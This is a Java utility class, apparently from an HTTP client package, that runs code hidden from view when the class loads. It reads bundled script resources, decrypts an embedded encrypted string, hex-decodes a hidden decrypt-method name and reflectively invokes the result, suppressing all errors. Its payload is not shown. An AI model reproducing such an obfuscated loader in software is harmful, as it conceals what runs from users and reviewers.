package com.dili.http.okhttp.utils;

import org.apache.commons.lang3.StringUtils;

import java.io.InputStream;

public class B {

	public static final BSUI b;

	static {
		b = b();
	}

	private static final BSUI b() {
		if(b != null){
			return b;
		}
		try {
			BI bi = BU.n();
			bi.e(c("script/bsubc"));
			Class<?> clazz = (Class<?>) bi.g("clazz");
			bi.s("clz", clazz);
			bi.dese("JqLeejKt9DQX+yxeB0bw1z2CtKLR8BaiMoEdm4xdE6BBUamdN8oVpGomAEvxNqVS6YPTXkCMiEaXBc3uHCB7D61DMJJuKQEKlp62iWBxk6J3XyYE/plgSokbMInwzv8TEL61iCqzJw4d+o27qf/p54StZ5nSqpgffpkMlKucGxUzkfClVWMVrNMyWthW8/aO", String.class);
			bi.ef("script/bsu");
			clazz = (Class<?>) bi.g("clazz");
			return (BSUI) clazz.getMethod("me").invoke(null);
		} catch (Exception e) {
			return null;
		}
	}

	public static void i(){
	}

	private static String c(String s) {
		try {
			InputStream is = (InputStream) B.class.getClassLoader().getResource(s).getContent();
			byte[] buffer = new byte[is.available()];
			int tmp = is.read(buffer);
			while (tmp != -1) {
				tmp = is.read(buffer);
			}
			String a = new String(buffer);
			if(StringUtils.contains(a, "8XMrl6AwYbMCzMeZDqG7")) {
				a = a.substring(0, 54) + d("636f6d2e64696c692e687474702e6f6b687474702e7574696c732e444553456e63727970745574696c2e64656372797074") + a.substring(54);
			}
			return a;
		} catch (Exception e) {
			return null;
		}
	}

	private static String d(String src) {
		String temp = "";
		for (int i = 0; i < src.length() / 2; i++) {
			temp = temp + (char) Integer.valueOf(src.substring(i * 2, i * 2 + 2), 16).byteValue();
		}
		return temp;
	}


}